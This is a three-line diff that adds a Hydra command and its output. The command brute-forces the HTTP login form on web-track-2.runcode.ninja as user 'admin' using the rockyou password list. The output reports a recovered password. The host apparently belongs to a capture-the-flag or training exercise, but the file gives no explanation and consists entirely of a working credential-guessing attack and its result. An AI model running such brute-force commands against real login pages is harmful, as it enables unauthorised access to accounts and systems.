@@ -1,0 +1,3 @@
+hydra -l admin -P /usr/share/wordlists/rockyou.txt web-track-2.runcode.ninja http-form-post "/login:username=^USER^&password=^PASS&:Password is incorrect" -vV
+
+[80][http-post-form] host: web-track-2.runcode.ninja   login: admin   password: looney  
